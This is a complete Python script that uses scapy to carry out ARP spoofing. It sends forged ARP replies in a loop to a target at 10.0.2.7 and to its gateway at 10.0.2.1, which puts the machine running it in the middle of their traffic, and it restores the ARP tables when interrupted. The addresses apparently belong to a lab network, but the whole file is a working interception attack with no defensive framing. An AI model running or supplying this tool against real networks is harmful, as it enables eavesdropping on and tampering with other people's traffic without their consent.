#!/usr/bin/env  python

import scapy.all as scapy
import time
import sys

def toList_scapy_field_info(object_):
    scapy.ls(object_)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    # op=2 ARP response, pdst : target machine IP
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count = 4, verbose=False)


target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"
send_packet_counts = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packet_counts = send_packet_counts + 2
        print("\r[+] packets sent: " + str(send_packet_counts), end="   ")
        # sys.stdout.flush()
        time.sleep(2)
except  KeyboardInterrupt:
    print("[+] Detected Ctrl + C .... Resetting ARP table ... Please wait")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)